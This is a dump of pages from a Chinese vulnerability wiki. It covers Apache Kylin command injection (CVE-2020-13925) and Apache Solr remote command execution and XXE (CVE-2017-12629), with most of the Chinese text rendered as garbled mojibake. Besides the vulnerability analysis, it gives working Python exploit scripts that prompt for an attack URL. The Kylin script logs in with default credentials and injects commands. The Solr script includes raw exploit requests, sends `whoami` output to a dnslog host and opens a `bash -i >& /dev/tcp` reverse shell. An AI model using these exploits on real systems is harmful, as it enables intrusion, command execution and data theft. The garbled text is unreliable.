GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-13925.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-13925.html","title":"Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-13925","keywords":"","body":"Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-13925 ÊºèÊ¥ûÊèèËø∞ 6ÊúàÔºå‰∫¨‰∏úÂÆâÂÖ®ÁöÑËìùÂÜõÂõ¢ÈòüÂèëÁé∞‰∫Ü‰∏Ä‰∏™ apache kylin ËøúÁ®ãÂëΩ‰ª§ÊâßË°å‰∏•ÈáçÊºèÊ¥ûÔºà CVE-2020-13925Ôºâ„ÄÇÈªëÂÆ¢ÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÊºèÊ¥ûÔºåÁôªÂΩï‰ªª‰ΩïÁÆ°ÁêÜÂëòË¥¶Âè∑ÂíåÂØÜÁ†ÅÈªòËÆ§Êú™‰øÆÊîπÁöÑË¥¶Âè∑ÔºåËé∑ÂæóÁÆ°ÁêÜÂëòÊùÉÈôê„ÄÇÁî±‰∫éApache KylinË¢´ÂπøÊ≥õÂ∫îÁî®‰∫é‰ºÅ‰∏öÁöÑÂ§ßÊï∞ÊçÆÂàÜÊûêÂπ≥Âè∞ÔºåÂõ†Ê≠§ËØ•ÊºèÊ¥ûÂ∞ÜÂØπ‰ºÅ‰∏öÊ†∏ÂøÉÊï∞ÊçÆÂÖ∑ÊúâËæÉÂ§ßÁöÑÂç±ÂÆ≥ÔºåÂ≠òÂú®Êï∞ÊçÆÊ≥ÑÈú≤È£éÈô©ÔºåÂª∫ËÆÆÁî®Êà∑Â∞ΩÂø´ÂçáÁ∫ßËΩØ‰ª∂Ëá≥ÂÆâÂÖ®ÁâàÊú¨„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1,Kylin 3.0.2 ÁéØÂ¢ÉÊê≠Âª∫ ËøôÈáå‰ΩøÁî® docker Êù•Êê≠Âª∫ÈúÄË¶ÅÁöÑÁéØÂ¢É KylinÂÆòÊñπÊñáÊ°£ docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] Â¶ÇÊûúÊúçÂä°Âô®ÂÜÖÂ≠òËæÉÂ∞èÔºåÂèØ‰∏çÈÄâÊã© -m 8G ÂèÇÊï∞ docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 ÊâìÂºÄÂêé‰ΩøÁî®ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Åadmin/KYLINÁôªÂΩïÔºåÂá∫Áé∞ÂàùÂßãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑ‰ª£Á†ÅÊñá‰ª∂Âú®server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java /** * Get diagnosis information for project */ @RequestMapping(value = \"/project/{project}/download\", method = { RequestMethod.GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo(@PathVariable String project, final HttpServletRequest request, final HttpServletResponse response) { try (AutoDeleteDirectory diagDir = new AutoDeleteDirectory(\"diag_project\", \"\")) { String filePath = dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile()); setDownloadResponse(filePath, response); } catch (IOException e) { throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); } } ËøôÈáåÂèØ‰ª•ÁúãÂà∞ {project}ÂèÇÊï∞ÊòØÁî®Êà∑ÂèØÊéßÁöÑÂèòÈáèÔºåÂêë‰∏ãË∑üËøõdumpProjectDiagnosisInfoÂáΩÊï∞ public String dumpProjectDiagnosisInfo(String project, File exportPath) throws IOException { aclEvaluate.checkProjectOperationPermission(project); String[] args = { project, exportPath.getAbsolutePath() }; runDiagnosisCLI(args); return getDiagnosisPackageName(exportPath); } È¶ñÂÖàÈÄöËøácheckProjectOperationPermissionÂáΩÊï∞Êù•Ê£ÄÊü•ËØ•projectÊòØÂê¶ËÆ∏ÂèØÔºåÁÑ∂ÂêéÊûÑÂª∫‰∏Ä‰∏™argsÁöÑÂ≠óÁ¨¶‰∏≤Êï∞ÁªÑÔºåÁúã‰∏Ä‰∏ãcheckProjectOperationPermissionÂáΩÊï∞ public void checkProjectOperationPermission(String projectName) { ProjectInstance projectInstance = getProjectInstance(projectName); aclUtil.hasProjectOperationPermission(projectInstance); } ËøôÈáå‰º†ÂÖ•projectNameÔºåÁÑ∂ÂêéÈÄöËøágetProjectInstanceÊù•Ëé∑ÂèñÈ°πÁõÆÂÆû‰æã,Ë∑üËøõgetProjectInstance private ProjectInstance getProjectInstance(String projectName) { return ProjectManager.getInstance(KylinConfig.getInstanceFromEnv()).getProject(projectName); } Âõ†‰∏∫ projectName ‰ºöË¢´Êàë‰ª¨ÊõøÊç¢ÊéâÔºåÊâÄ‰ª•‰∏ç‰ºöËé∑Âæó‰∏Ä‰∏™Ê≠£Á°ÆÁöÑprojectName,Âàô‰ºöËøîÂõû‰∏Ä‰∏™NullÔºåÊü•Áúã‰∏ãhasProjectOperationPermissionÂáΩÊï∞ @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\") public boolean hasProjectOperationPermission(ProjectInstance project) { return true; } ËøôÈáåÂπ∂Ê≤°ÊúâÂØπprojectNameËøõË°åÊ£ÄÈ™åÔºåÂè™ÂØπÁî®Êà∑Ë∫´‰ªΩËøõË°å‰∫ÜÊ£ÄÈ™åÔºåÂΩì‰∏∫ADMIN„ÄÅADMINISTRATION„ÄÅMANAGEMENT„ÄÅOPERATIONÁ≠âÊùÉÈôêÔºåËØ•ÂÄºÈªòËÆ§ËøîÂõû‰∏∫trueÔºåÂõûÂà∞ dumpProjectDiagnosisInfoÂáΩÊï∞ÔºåÂêë‰∏ãÁªßÁª≠Ë∑üËøõrunDiagnosisCLIÂáΩÊï∞ private void runDiagnosisCLI(String[] args) throws IOException { Message msg = MsgPicker.getMsg(); File cwd = new File(\"\"); logger.debug(\"Current path: \" + cwd.getAbsolutePath()); logger.debug(\"DiagnosisInfoCLI args: \" + Arrays.toString(args)); File script = new File(KylinConfig.getKylinHome() + File.separator + \"bin\", \"diag.sh\"); if (!script.exists()) { throw new BadRequestException( String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath())); } String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); if (cmdOutput.getFirst() != 0) { throw new BadRequestException(msg.getGENERATE_DIAG_PACKAGE_FAIL()); } } Ê≥®ÊÑèÁúãËøôÂá†Ë°å‰ª£Á†Å String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); ‰∏é Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956 Á±ª‰ººÔºåÂêåÊ†∑‰πüÊòØÁªèËøáexecuteÂáΩÊï∞ÔºåËÄådigCmdÂêåÊ†∑‰πüÊòØÁªèËøá‰∫ÜÂëΩ‰ª§ÊãºÊé• private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } ËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáÊéßÂà∂ {project} ËØ∑Ê±ÇÂ∞±ÂèØ‰ª•ÈÄ†ÊàêÂëΩ‰ª§Ê≥®ÂÖ• /kylin/api/diag/project/{project}/download /kylin/api/diag/project/||ping `whoami.111.111.111`||/download ÊãºÊé•ÂêéÂàôÂá∫Áé∞ /home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir} ËøôÈáåÈÄöËøáÊä•ÈîôËØ≠Âè•ÂèØ‰ª•ÂõûÊòæÂëΩ‰ª§È™åËØÅÊºèÊ¥ûÂ≠òÂú® throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); Âú®‰øÆÂ§ç‰∏≠ÔºåËøáÊª§‰∫Ü||,&&Á≠âÁ¨¶Âè∑ÔºåÈÄ†ÊàêÊó†Ê≥ïÂëΩ‰ª§Ê≥®ÂÖ• ÊºèÊ¥ûÈÄöÊä•‰∏≠ÂÖ±‰∏§‰∏™Âà©Áî®ÁÇπ /kylin/api/diag/project/{project}/download /kylin/api/diag/job/{jobId}/download Êü•ÁúãÂáΩÊï∞ÂèëÁé∞Âà©Áî®ÊñπÂºèÁõ∏ÂêåÔºåÁõ¥Êé•Âà©Áî®job‰ºöÂ§±Ë¥•ÔºåÂõ†‰∏∫ {project}ÈªòËÆ§Êúâ‰∏Ä‰∏™learn_kylinÔºåËÄåjobÊ≤°Êúâ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(Ê†ºÂºè‰∏∫User:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] Ë¥¶Âè∑ÂØÜÁ†ÅÂá∫Áé∞ÈîôËØØ \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] ÊàêÂäüÁôªÂΩïÔºåËé∑ÂæóJSESSIONIDÔºö\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"] except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, cookie): vuln_url = target_url + '/kylin/api/diag/project/%7C%7Cping%20%60whoami%60.111.111.111%7C%7C/download' headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \".111.111.111||\" in response.text: whoami = re.findall(r'ping: (.*?).111.111.111: Êú™Áü•ÁöÑÂêçÁß∞ÊàñÊúçÂä°',response.text)[0] print(\"\\033[32m[o] Â≠òÂú®ÊºèÊ¥ûÔºåÊàêÂäüÊâßË°åwhoamiÔºåÂìçÂ∫î‰∏∫{}\\033[0m\".format(whoami)) else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•,||,&&Á≠âÁ¨¶Âè∑Â∑≤Ë¢´ËøáÊª§ÔºåÊó†Ê≥ïÈÄ†ÊàêÂëΩ‰ª§Ê≥®ÂÖ•\\033[0m\") except: print(\"\\033[31m[x] ËØ∑Ê±ÇË∂ÖÊó∂\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie = POC_1(target_url) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") sys.exit(0) POC_2(target_url, cookie) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE ËøúÁ®ãÊâßË°åÊºèÊ¥û CVE-2019-0193 Apache Solr VelocityÊ®°ÊùøËøúÁ®ãÊâßË°å CVE-2019-17558 Apache Solr ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-12629 Apache Solr XXE ÊºèÊ¥û CVE-2017-12629 Apache Solr JMXÊúçÂä° RCE CVE-2019-12409 Apache Solr RCE Êú™ÊéàÊùÉ‰∏ä‰º†ÊºèÊ¥û CVE-2020-13957 Apache Solr ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr RCE ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-12629.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr RCE ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-12629.html","title":"Apache Solr RCE ËøúÁ®ãÊâßË°åÊºèÊ¥û CVE-2017-12629","keywords":"","body":"Apache Solr RCE ËøúÁ®ãÊâßË°åÊºèÊ¥û CVE-2017-12629 ÊºèÊ¥ûÊèèËø∞ Apache Solr ÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÊêúÁ¥¢ÊúçÂä°Âô®„ÄÇSolr ‰ΩøÁî® Java ËØ≠Ë®ÄÂºÄÂèëÔºå‰∏ªË¶ÅÂü∫‰∫é HTTP Âíå Apache Lucene ÂÆûÁé∞„ÄÇÂéüÁêÜÂ§ßËá¥ÊòØÊñáÊ°£ÈÄöËøáHttpÂà©Áî®XMLÂä†Âà∞‰∏Ä‰∏™ÊêúÁ¥¢ÈõÜÂêà‰∏≠„ÄÇÊü•ËØ¢ËØ•ÈõÜÂêà‰πüÊòØÈÄöËøá httpÊî∂Âà∞‰∏Ä‰∏™XML/JSONÂìçÂ∫îÊù•ÂÆûÁé∞„ÄÇÊ≠§Ê¨°7.1.0‰πãÂâçÁâàÊú¨ÊÄªÂÖ±ÁàÜÂá∫‰∏§‰∏™ÊºèÊ¥ûÔºöXMLÂÆû‰ΩìÊâ©Â±ïÊºèÊ¥ûÔºàXXEÔºâÂíåËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºàRCEÔºâÔºå‰∫åËÄÖÂèØ‰ª•ËøûÊé•ÊàêÂà©Áî®ÈìæÔºåÁºñÂè∑Âùá‰∏∫CVE-2017-12629„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Solr ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d ÊºèÊ¥ûÂ§çÁé∞ ËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÂÖàËØ∑Ê±ÇurlÂú∞ÂùÄËé∑Âèñ core ÂÜÖÂÆπ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] ÈÄöËøáÊü•Áúã‰ª£Á†ÅÔºåËÉΩÂ§üËß¶ÂèëÂëΩ‰ª§ÊâßË°åÁöÑ‰∫ã‰ª∂Êúâ‰∏§‰∏™ÔºöpostCommit Âíå newSearcher ‰ΩøÁî® postCommit Á¨¨‰∏Ä‰∏™ËØ∑Ê±ÇÂåÖÁî®‰∫éËΩΩÂÖ•ÁºìÂ≠ò‰∏≠ [!NOTE] exe : ping ÊâßË°åÁöÑÂëΩ‰ª§ dir: ÂëΩ‰ª§Â≠òÂú®ÁöÑÁõÆÂΩï‰ΩçÁΩÆ args:ÂëΩ‰ª§ÂèÇÊï∞ Â¶Ç‰∏ãËØ∑Ê±ÇÂåÖÊâßË°åÁöÑÊòØ /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } Á¨¨‰∫å‰∏™ËØ∑Ê±ÇÂåÖÁî®‰∫éÊõ¥Êñ∞ÁºìÂ≠òÂπ∂ÊâßË°åÂëΩ‰ª§ POST /solr/demo/update HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] Ê≥®ÊÑè Á¨¨‰∏Ä‰∏™ËØ∑Ê±ÇÂåÖÁöÑËøô‰∏™‰ΩçÁΩÆ \"name\":\"newlistener-1\", listererÁöÑÂêçÂ≠óÈúÄË¶ÅÊõøÊç¢Ôºå‰æãÂ¶ÇÁ¨¨‰∏ÄÊ¨° ‰∏∫ newlistener-1 ÔºåÁ¨¨‰∫åÊ¨°ÂàôÈúÄË¶ÅÊîπ‰∏∫ newlistener-2 Ê≥®ÊÑè Á¨¨‰∫å‰∏™ËØ∑Ê±ÇÂåÖÁöÑËøô‰∏™‰ΩçÁΩÆ [{\"id\":\"test\"}]Ôºå ÂêåÁ¨¨‰∏Ä‰∏™ËØ∑Ê±ÇÂåÖÁöÑnameÔºåÊØèÊâßË°å‰∏ÄÊ¨°Â∞±ÈúÄË¶ÅÊõ¥Êç¢ id ,‰æãÂ¶ÇÁ¨¨‰∏ÄÊ¨° ‰∏∫ test ÔºåÁ¨¨‰∫åÊ¨°ÂàôÈúÄË¶ÅÊîπ‰∏∫ tset-2 Ê≥®ÊÑè Content-Type: application/json ÈúÄË¶ÅÊ∑ªÂä† ‰∏çÊõ¥ÊîπÊâßË°åÂèëÁîüÊä•ÈîôÁ§∫‰æã ËøõÂÖ•dockerÂÆπÂô®Êü•ÁúãÂèëÁé∞ÂëΩ‰ª§Â∑≤ÁªèÊâßË°å ‰ΩøÁî® newSearcher ‰ΩøÁî® newSearcherÂèØ‰ª•Áõ¥Êé•Âä†ËΩΩÂÖ•ÁºìÂ≠òÊâßË°åÂëΩ‰ª§ ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearcher\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[ \"-c\", \"mkdir /tmp/vuln\", ] } } [!NOTE] Ê≥®ÊÑèÁÇπÂêå‰∏äÔºå‰πüÈúÄË¶ÅÊØèÊ¨°ÊâßË°åÊõ¥Êîπ \"name\":\"newlistener-2\" ÁöÑÂèÇÊï∞ ÊàêÂäüÊâßË°å‰∫ÜÂàõÂª∫Êñá‰ª∂ÁöÑÂëΩ‰ª§ ÂÖ≥‰∫é Â¶ÇÊûúÊÉ≥Ë¶ÅÊâßË°åÂÖ∂‰ªñÂëΩ‰ª§,ÂàôÈúÄË¶ÅÂëΩ‰ª§ÁöÑÁöÑ‰ΩçÁΩÆÔºå‰æãÂ¶ÇÊâßË°åpingÔºåÂàôÈúÄË¶ÅËÆæÁΩÆdirÂèÇÊï∞‰∏∫ /usr/bin/ping ÊàñËÄÖ /bin/pingÔºåÂ¶ÇÊûúÈúÄË¶ÅÊ£ÄÊµãÊºèÊ¥ûÊòØÂê¶Â≠òÂú®ÂàôÂèØ‰ª•‰ΩøÁî® dnslogÊù•Ê£ÄÊµã ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslogÂú∞ÂùÄ(ÊºèÊ¥ûÂ§ñËøûÊ£ÄÊµã) \\033[0m') print('+ \\033[36mCmd >>> shell(ÂèçÂºπshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] ÊàêÂäüËé∑Âæócore_name,Url‰∏∫Ôºö\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] ÊàêÂäüÊâßË°åÔºåËØ∑Êü•Áúãdnslog \\033[0m\") else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] ÊàêÂäüÊâßË°å \\033[0m\") else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mËØ∑ËæìÂÖ•‰Ω†ÁöÑdnslogÂú∞ÂùÄÔºö\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] Â¶ÇÊûúshellÊàñdnslogÊó†ÂèçÂ∫îÔºåÂèØ‰ª•ÈÄâÊã©Êõ¥Êîπ‰∏Ä‰∏ãPOCÁöÑÈÉ®ÂàÜÂèÇÊï∞ÊâßË°åÈúÄË¶ÅÁöÑ‰ª£Á†Å ÂèÇËÄÉÊñáÁ´† Apache SolrËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºàCVE-2017-12629Ôºâ‰ªéÂà©Áî®Âà∞ÂÖ•‰æµÊ£ÄÊµã cve-2017-12629 apache solr xxe & rce ÊºèÊ¥ûÂàÜÊûê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr XXE ÊºèÊ¥û CVE-2017-12629.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr XXE ÊºèÊ¥û CVE-2017-12629.html","title":"Apache Solr XXE ÊºèÊ¥û CVE-2017-12629","keywords":"","body":"Apache Solr XXE ÊºèÊ¥û CVE-2017-12629 ÊºèÊ¥ûÊèèËø∞ Apache Solr ÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÊêúÁ¥¢ÊúçÂä°Âô®„ÄÇSolr ‰ΩøÁî® Java ËØ≠Ë®ÄÂºÄÂèëÔºå‰∏ªË¶ÅÂü∫‰∫é HTTP Âíå Apache Lucene ÂÆûÁé∞„ÄÇÂéüÁêÜÂ§ßËá¥ÊòØÊñáÊ°£ÈÄöËøáHttpÂà©Áî®XMLÂä†Âà∞‰∏Ä‰∏™ÊêúÁ¥¢ÈõÜÂêà‰∏≠„ÄÇÊü•ËØ¢ËØ•ÈõÜÂêà‰πüÊòØÈÄöËøá httpÊî∂Âà∞‰∏Ä‰∏™XML/JSONÂìçÂ∫îÊù•ÂÆûÁé∞„ÄÇÊ≠§Ê¨°7.1.0‰πãÂâçÁâàÊú¨ÊÄªÂÖ±ÁàÜÂá∫‰∏§‰∏™ÊºèÊ¥ûÔºöXMLÂÆû‰ΩìÊâ©Â±ïÊºèÊ¥ûÔºàXXEÔºâÂíåËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºàRCEÔºâ„ÄÇ ÂΩ±ÂìçÁâàÊú¨ Apache Solr ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d ÊºèÊ¥ûÂ§çÁé∞ Dnslog ÂÖàËØ∑Ê±ÇurlÂú∞ÂùÄËé∑Âèñ core ÂÜÖÂÆπ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml Êü•ÁúãdnslogÂæóÂà∞ËØ∑Ê±Ç ËøúÁ®ãËØªÂèñÊñá‰ª∂ 